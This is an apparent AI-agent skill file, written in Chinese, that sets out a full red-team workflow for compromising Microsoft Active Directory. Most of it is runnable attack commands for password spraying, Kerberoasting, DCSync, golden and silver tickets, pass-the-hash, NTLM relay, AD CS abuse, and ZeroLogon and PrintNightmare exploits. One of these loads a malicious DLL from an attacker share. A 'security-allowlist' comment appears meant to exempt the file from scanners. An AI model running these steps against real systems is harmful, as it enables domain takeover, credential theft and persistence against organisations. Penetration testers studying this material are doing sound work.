---
name: active-directory-attacks
description: "提供攻击 Microsoft Active Directory 环境的综合技术。涵盖侦察、凭据获取、Kerberos 攻击、横向移动、权限提升和域控制，适用于红队行动和渗透测试。触发词：Active Directory 攻击、AD 攻击、域渗透、Kerberos 攻击、域控攻击、红队行动、渗透测试 AD、凭据获取、域权限提升、Golden Ticket、Silver Ticket、Pass-the-Hash、DCSync、Kerberoasting、AS-REP Roasting、NTLM Relay、ZeroLogon、PrintNightmare、AD CS 攻击"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> 仅限授权使用：本技能仅用于授权的安全评估、防御验证或受控教育环境。

<!-- security-allowlist: credential-extraction, kerberos-attacks -->

# Active Directory 攻击

## 目的

提供攻击 Microsoft Active Directory 环境的综合技术。涵盖侦察、凭据获取、Kerberos 攻击、横向移动、权限提升和域控制，适用于红队行动和渗透测试。

## 输入/前置条件

- Kali Linux 或 Windows 攻击平台
- 域用户凭据（大多数攻击需要）
- 到域控制器的网络访问
- 工具：Impacket、Mimikatz、BloodHound、Rubeus、CrackMapExec

## 输出/交付物

- 域枚举数据
- 提取的凭据和哈希
- 用于模拟的 Kerberos 票据
- 域管理员访问权限
- 持久化访问机制

---

## 核心工具

| 工具 | 用途 |
|------|------|
| BloodHound | AD 攻击路径可视化 |
| Impacket | Python AD 攻击工具 |
| Mimikatz | 凭据提取 |
| Rubeus | Kerberos 攻击 |
| CrackMapExec | 网络利用 |
| PowerView | AD 枚举 |
| Responder | LLMNR/NBT-NS 投毒 |

---

## 核心工作流

### 步骤 1：Kerberos 时钟同步

Kerberos 要求时钟同步（±5 分钟）：

```bash
# 检测时钟偏差
nmap -sT 10.10.10.10 -p445 --script smb2-time

# 在 Linux 上修复时钟
sudo date -s "14 APR 2024 18:25:16"

# 在 Windows 上修复时钟
net time /domain /set

# 不更改系统时间的伪造时钟
faketime -f '+8h' <command>
```

### 步骤 2：使用 BloodHound 进行 AD 侦察

```bash
# 启动 BloodHound
neo4j console
bloodhound --no-sandbox

# 使用 SharpHound 收集数据
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python 收集器（从 Linux）
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### 步骤 3：PowerView 枚举

```powershell
# 获取域信息
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# 枚举用户
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# 枚举组
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# 查找本地管理员访问权限
Find-LocalAdminAccess -Verbose

# 用户搜寻
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## 凭据攻击

### 密码喷洒

```bash
# 使用 kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# 使用 CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

提取服务账户 TGS 票据并离线破解：

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# 使用 hashcat 破解
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

针对"不需要 Kerberos 预认证"的账户：

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# 使用 hashcat 破解
hashcat -m 18200 hashes.txt rockyou.txt
```

### DCSync 攻击

直接从域控制器提取凭据（需要 Replicating Directory Changes 权限）：

```bash
# Impacket
secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Kerberos 票据攻击

### Pass-the-Ticket（黄金票据）

使用 krbtgt 哈希为任意用户伪造 TGT：

```powershell
# 首先通过 DCSync 获取 krbtgt 哈希
# Mimikatz - 创建黄金票据
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### 白银票据

为特定服务伪造 TGS：

```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
```

### OverPass-the-Hash

将 NTLM 哈希转换为 Kerberos 票据：

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

---

## NTLM 中继攻击

### Responder + ntlmrelayx

```bash
# 启动 Responder（禁用 SMB/HTTP 用于中继）
responder -I eth0 -wrf

# 启动中继
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP 中继用于委派攻击
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

### SMB 签名检查

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

---

## 证书服务攻击（AD CS）

### ESC1 - 配置错误的模板

```bash
# 查找易受攻击的模板
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# 利用 ESC1
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local

# 使用证书认证
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8 - Web Enrollment 中继

```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

---

## 关键 CVE

### ZeroLogon（CVE-2020-1472）

```bash
# 检查漏洞
crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon

# 利用漏洞
python3 cve-2020-1472-exploit.py DC01 10.10.10.10

# 提取哈希
secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass

# 恢复密码（重要！）
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

### PrintNightmare（CVE-2021-1675）

```bash
# 检查漏洞
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'

# 利用漏洞（需要托管恶意 DLL）
python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
```

### samAccountName 欺骗（CVE-2021-42278/42287）

```bash
# 自动化利用
python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
```

---

## 快速参考

| 攻击 | 工具 | 命令 |
|--------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

---

## 约束

**必须：**
- 在 Kerberos 攻击前与域控制器同步时间
- 大多数攻击需要有效的域凭据
- 记录所有被攻陷的账户

**禁止：**
- 过度密码喷洒导致账户锁定
- 未经批准修改生产 AD 对象
- 留下未记录的黄金票据

**应该：**
- 运行 BloodHound 进行攻击路径发现
- 在中继攻击前检查 SMB 签名
- 在利用 CVE 前验证补丁级别

---

## 示例

### 示例 1：通过 Kerberoasting 攻陷域

```bash
# 1. 查找带有 SPN 的服务账户
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10

# 2. 请求 TGS 票据
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# 3. 破解票据
hashcat -m 13100 tgs.txt rockyou.txt

# 4. 使用破解的服务账户
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```

### 示例 2：NTLM 中继到 LDAP

```bash
# 1. 启动针对 LDAP 的中继
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# 2. 触发认证（例如通过 PrinterBug）
python3 printerbug.py domain.local/user:pass@target 10.10.10.12

# 3. 使用创建的机器账户进行 RBCD 攻击
```

---

## 故障排除

| 问题 | 解决方案 |
|-------|----------|
| 时钟偏差过大 | 与域控制器同步时间或使用 faketime |
| Kerberoasting 返回空 | 没有带 SPN 的服务账户 |
| DCSync 访问被拒绝 | 需要 Replicating Directory Changes 权限 |
| NTLM 中继失败 | 检查 SMB 签名，尝试 LDAP 目标 |
| BloodHound 为空 | 验证收集器是否使用正确凭据运行 |

---

## 其他资源

关于高级技术，包括委派攻击、GPO 滥用、RODC 攻击、SCCM/WSUS 部署、ADCS 利用、信任关系和 Linux AD 集成，请参阅 [references/advanced-attacks.md](references/advanced-attacks.md)。

## 何时使用
本技能适用于执行概述中描述的工作流或操作。
